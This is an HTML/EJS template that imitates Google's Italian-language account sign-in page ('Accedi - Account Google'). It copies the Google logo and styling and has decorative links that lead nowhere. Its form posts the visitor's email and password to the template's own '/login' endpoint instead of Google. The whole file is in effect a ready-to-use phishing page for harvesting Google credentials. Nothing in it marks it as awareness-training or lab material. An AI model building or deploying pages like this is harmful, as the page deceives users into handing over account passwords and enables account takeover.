<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Accedi - Account Google</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      color-scheme: light;
      --bg: #f1f3f4;
      --panel: #ffffff;
      --panel-border: #dadce0;
      --text: #202124;
      --muted: #5f6368;
      --link: #1a73e8;
      --button: #e8f0fe;
      --button-text: #1a73e8;
      --input-border: #dadce0;
    }

    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      min-height: 100%;
      background: var(--bg);
      font-family: 'Inter', sans-serif;
      color: var(--text);
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 24px 24px;
    }

    .card {
      width: min(100%, 960px);
      background: var(--panel);
      border-radius: 28px;
      padding: 32px 36px 28px;
      border: 1px solid var(--panel-border);
      box-shadow: 0 10px 30px rgba(60,64,67,0.12);
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 32px;
      align-items: center;
    }

    .brand {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 44px;
      height: 44px;
      margin-bottom: 24px;
    }

    .brand svg {
      width: 44px;
      height: 44px;
      display: block;
    }

    h1 {
      margin: 0;
      font-size: clamp(2.5rem, 5vw, 3.3rem);
      line-height: 1.05;
      font-weight: 400;
      letter-spacing: -0.04em;
      color: #202124;
    }

    .subtitle {
      margin: 18px 0 0;
      font-size: 1.02rem;
      line-height: 1.5;
      color: var(--text);
    }

    .form-wrap {
      padding-left: 8px;
    }

    .field {
      width: 100%;
      height: 48px;
      border: 1px solid var(--input-border);
      background: #fff;
      color: var(--text);
      border-radius: 4px;
      padding: 0 16px;
      font-size: 1rem;
      outline: none;
    }

    .field::placeholder {
      color: #80868b;
    }

    .field:focus {
      border-color: var(--link);
      box-shadow: 0 0 0 1px var(--link) inset;
    }

    .link {
      margin-top: 10px;
      display: inline-block;
      color: var(--link);
      font-size: 0.92rem;
      font-weight: 500;
      text-decoration: none;
    }

    .small-copy {
      margin: 28px 0 0;
      color: var(--muted);
      font-size: 0.92rem;
      line-height: 1.5;
    }

    .small-copy a {
      color: var(--link);
      text-decoration: none;
      font-weight: 600;
    }

    .actions {
      margin-top: 28px;
      display: flex;
      align-items: center;
      justify-content: flex-end;
      gap: 22px;
    }

    .secondary-link {
      color: var(--link);
      font-size: 0.98rem;
      font-weight: 500;
      text-decoration: none;
    }

    .primary-btn {
      border: 0;
      background: #1a73e8;
      color: #ffffff;
      border-radius: 9999px;
      padding: 11px 24px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      min-width: 84px;
      box-shadow: none;
    }

    .primary-btn:hover {
      filter: brightness(0.96);
    }

    .footer {
      width: min(100%, 960px);
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 18px 8px 0;
      color: var(--muted);
      font-size: 0.82rem;
    }

    .footer .links {
      display: flex;
      gap: 28px;
      align-items: center;
    }

    .footer a {
      color: var(--muted);
      text-decoration: none;
    }

    @media (max-width: 820px) {
      .card {
        padding: 28px 24px;
      }

      .grid {
        grid-template-columns: 1fr;
        gap: 24px;
      }

      .form-wrap {
        padding-left: 0;
      }

      .actions {
        justify-content: space-between;
      }

      .footer {
        flex-direction: column;
        gap: 16px;
      }
    }

    @media (max-width: 520px) {
      body {
        padding-inline: 12px;
      }

      .card {
        border-radius: 24px;
        padding: 24px 18px;
      }

      h1 {
        font-size: 2.2rem;
      }

      .actions {
        flex-direction: column;
        align-items: stretch;
      }

      .secondary-link,
      .primary-btn {
        width: 100%;
        text-align: center;
      }
    }
  </style>
</head>
<body>
  <main class="card" aria-label="Accesso Google">
    <div class="grid">
      <section>
        <div class="brand" aria-hidden="true">
          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" role="img">
            <path fill="#EA4335" d="M24 9.5c3.3 0 6.3 1.2 8.6 3.4l6.4-6.4C34.5 2.9 29.6 1 24 1 14.9 1 7.1 6.2 3.3 13.8l7.5 5.8C12.8 14.2 17.9 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.5 24.5c0-1.7-.2-3.3-.5-4.8H24v9.1h12.6c-.6 3.1-2.4 5.7-5.1 7.4l7.8 6c4.6-4.2 7.2-10.4 7.2-17.7z"/>
            <path fill="#FBBC05" d="M10.8 28.8c-1-3-1-6.2 0-9.2l-7.5-5.8C1.1 17.3 0 20.6 0 24s1.1 6.7 3.3 10.2l7.5-5.4z"/>
            <path fill="#34A853" d="M24 47c5.6 0 10.6-1.8 14.2-4.9l-7.8-6c-2.2 1.5-5 2.3-8.4 2.3-6.1 0-11.2-4.7-13.2-10.8l-7.5 5.4C7.1 41.8 14.9 47 24 47z"/>
          </svg>
        </div>
        <h1>Accedi</h1>
        <p class="subtitle">Utilizza il tuo Account Google</p>
      </section>

      <section class="form-wrap">
        <% if (errorMessage) { %>
          <div style="margin-bottom:12px;background:#ffecec;border:1px solid #f5c6cb;color:#a94442;padding:10px;border-radius:6px;">
            <%= errorMessage %>
          </div>
        <% } %>

        <form method="POST" action="/login">
          <input class="field" type="email" name="email" id="email" placeholder="Email" autocomplete="username" required />
          <div style="height:14px;"></div>
          <input class="field" type="password" name="password" id="password" placeholder="Password" autocomplete="current-password" required />
          <a class="link" href="#">Non ricordi l'indirizzo email?</a>

          <p class="small-copy">
            Non si tratta del tuo computer? Utilizza una finestra privata per accedere.
            <a href="#">Scopri di più sull'utilizzo della modalità Ospite</a>
          </p>

          <div class="actions">
            <button class="primary-btn" type="submit">Accedi</button>
          </div>
        </form>
      </section>
    </div>
  </main>

  <footer class="footer" aria-label="Footer Google">
    <div>Italiano</div>
    <div class="links">
      <a href="#">Guida</a>
      <a href="#">Privacy</a>
      <a href="#">Termini</a>
    </div>
  </footer>
</body>
</html>